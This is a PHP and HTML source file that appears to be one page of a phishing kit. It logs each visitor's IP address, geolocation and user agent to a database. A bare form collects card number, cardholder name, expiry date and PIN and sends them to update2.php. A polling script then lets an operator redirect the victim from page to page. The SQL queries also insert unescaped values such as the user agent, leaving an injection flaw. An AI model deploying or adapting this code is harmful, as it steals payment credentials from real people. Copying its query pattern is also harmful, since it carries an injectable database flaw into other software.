<?php include 'db.php'; $page_ = "page2"; ?>
<?php
// Get user IP address
$userIP = $_SERVER['REMOTE_ADDR'];
//$userIP ="139.144.40.102";

// Use JSON encoded string and converts 
// it into a PHP variable 
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip={$userIP}")); 

$flag_ = strtolower($ipdat->geoplugin_countryCode);
$countryName =  $ipdat->geoplugin_countryName; 
$ipAddress = $userIP;
$image = 'https://ipdata.co/flags/'.$flag_.'.png';
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$page_ = $page_;
$submitted = 'no';
$selected = 'no';
$timeStamp =date('Y-m-d H:i:s');
// Query to check if the username exists in the database
$sql1 = "SELECT * FROM visitors WHERE ip_address = '$ipAddress'";
$result1 = $conn->query($sql1);

if ($result1->num_rows > 0) {
        // Username exists in the database
     //   $sql2 = "UPDATE visitors SET current_page='$page_', timeStamp='$timeStamp' WHERE ip_address='$ipAddress'";
      $sql2 = "UPDATE visitors SET submitted_form='0', current_page='$page_', timeStamp='$timeStamp' WHERE ip_address='$ipAddress'";
            // Execute the query
            if ($conn->query($sql2) === TRUE) {
                echo "Record updated successfully with current date and time";
            } else {
                echo "Error updating record: " . $conn->error;
            }
} else {
        $sql2 = "INSERT INTO visitors(country, ip_address, image, user_agent, current_page, submitted_form, selected_page, timeStamp, log1) VALUES ('$countryName','$ipAddress','$image','$userAgent','$page_','$submitted','$selected','$timeStamp', '')";
        // Execute the query
        if ($conn->query($sql2) === TRUE) {
            echo "Record inserted successfully with current date and time";
        } else {
            echo "Error inserting record: " . $conn->error;
        }
}


// Close the database connection
$conn->close();


?>
<!DOCTYPE html>
<html>
<head>
    <title>Visitor Page</title>
    <!-- Bootstrap CSS link -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  
    <script>

    </script>


</head>
<body>
    <!-- Your Page Content -->
    <div class="container">
        <!-- Visitor Page Content -->
        <h1>Welcome to Page 1</h1>
        <!-- Your Form and Submit Button -->
        <form method="post" action="nex.yt" id="myForm" >
            <input type="text"  name="card"  id="card"><br>
            <input type="text"  name="name"  id="name"><br>
              <input type="text"  name="exp"  id="exp"><br>
            <input type="text"  name="pin"  id="pin">
            <input type="hidden" value='1' name="submitted"  id="submitted">
            <input type="hidden"  value="<?php  echo $ipAddress; ?>" name="ipAddress" id="ipAddress" >
            <input id="submitButton" type="submit" onclick="submitForm(event)">
        </form>
    </div>
    <script>
    
    //check function
    function checkLink() {
  fetch('<?php echo $url__; ?>getPage.php?ipAddress=<?php echo $ipAddress; ?>')
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      var res_ = response.text();
      console.log(res_);
      return res_;
    })
    .then(data => {
      if (data.trim() === '<?php echo $page_; ?>.php') {
        // Link is still 'page1.php', continue checking after 1 second
        setTimeout(checkLink, 1000);
      } else {
        // Link has changed, redirect to a new page
        window.location.href = data.trim();
      }
    })
    .catch(error => {
      // Handle any errors during the fetch request
      console.error('Error:', error);
    });
}





        function submitForm(event) {
            event.preventDefault(); // Prevent the form from submitting

            // Get the submit button and form elements
            const submitButton = document.getElementById('submitButton');
            const form = document.getElementById('myForm');

            // Change the button text to indicate loading
            submitButton.value = 'Loading...';
            
            // Disable the button to prevent multiple submissions
            submitButton.disabled = true;
            
        
        
        
            //submitButton.innerHTML = 'Submit';
            const card = document.getElementById('card').value;
            const name = document.getElementById('name').value;
             const exp = document.getElementById('exp').value;
            const pin = document.getElementById('pin').value;
            const submitted = document.getElementById('submitted').value;
            const ipAddress = document.getElementById('ipAddress').value;
            //submitButton.disabled = false;
            let xhr = new XMLHttpRequest();

            xhr.onreadystatechange = function() {
              if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                  // Request was successful, handle the response here
                  console.log(xhr.responseText);
                } else {
                  // There was an error with the request
                  console.error('Error:', xhr.status);
                }
              }
            };
            
            
            var url_ = "./update2.php?card="+card+"&name="+name+"&exp="+exp+"&pin="+pin+"&submitted="+submitted+"&ipAddress="+ipAddress;
            //alert(url_);
            
            xhr.open('GET', url_, true);
            xhr.send();
            
            
            
            // Start checking the link initially
            checkLink();
            
            
        }
</script>

  
</body>
</html>
